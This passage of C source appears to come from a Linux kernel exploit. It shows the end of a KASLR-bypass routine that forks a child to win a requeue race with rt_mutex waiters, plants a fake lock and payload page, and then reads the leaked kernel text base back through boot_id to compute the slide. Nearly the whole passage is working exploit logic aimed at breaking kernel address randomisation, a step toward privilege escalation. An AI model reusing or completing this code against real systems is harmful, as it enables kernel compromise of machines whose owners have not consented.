  }
  kaslr_base = KIMAGE_TEXT_BASE + slide_slide;
  kaslr_slide = slide_slide;
  pr_success("slide oracle set kaslr_base=%016llx slide=%016llx\n",
             (unsigned long long)kaslr_base,
             (unsigned long long)kaslr_slide);
#ifdef CFGOPS_4_19_STYLE
  pr_warning("slide: bootid rb-gadget values derived for 4.19 "
             "(READ_PAIR=%016llx RANDOM_BOOT_ID_DATA=%016llx)\n",
             (unsigned long long)(SLIDE_READ_PAIR_IMAGE + slide_slide),
             (unsigned long long)(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE + slide_slide));
#endif
  for (int attempt = 1; attempt <= SLIDE_MAX_ATTEMPTS; attempt++) {
#ifdef SLIDE_MIRROR_MODE
    /* z3q: the walk only dereferences fake_lock as an all-zero empty
     * rt_mutex, so the .bss tail hole (slid along with the image) stands
     * in for the KernelSnitch-leaked payload page (see target.h). */
    page_base = SLIDE_MIRROR_LOCK_IMAGE + slide_slide;
    fake_lock = SLIDE_MIRROR_LOCK_IMAGE + slide_slide;
    fake_w0 = fake_lock + 0x100; /* guard-only value in slide mode */
    pr_info("slide mirror mode lock=%016zx\n", fake_lock);
#else
    page_base = prepare_good_kernel_page(PAGE_PAYLOAD_SLIDE);
    if (!page_base || !fake_lock) {
      continue;
    }
#endif

    /* The gadget write lands during the CHILD's stamp window (the
     * requeue-race cleanup erases the stamped rt_waiter). The boot_id
     * readback happens HERE, in the parent, after the child is reaped. */
    slide_capture_stock_bootid();

    pid_t child = SYSCHK(fork());
    if (child == 0) {
      disable_rseq_for_thread();
      log_slide_child_context();
      slide_child_leak_stext();
      _exit(1);
    }

    int status = 0;
    SYSCHK(waitpid(child, &status, 0));

    uint64_t stext = slide_read_stext();
    if (!stext) {
      pr_warning("slide attempt %d failed (child status=%d, boot_id "
                 "unchanged)\n", attempt, status);
      continue;
    }

    kaslr_base = stext;
    kaslr_slide = kaslr_base - KIMAGE_TEXT_BASE;
    kaslr_done = 1;
    pr_success("slide-kaslr-ok pid=%d base=%016llx slide=%016llx\n",
               getpid(), (unsigned long long)kaslr_base,
               (unsigned long long)kaslr_slide);
    return 1;
  }

  return 0;
}
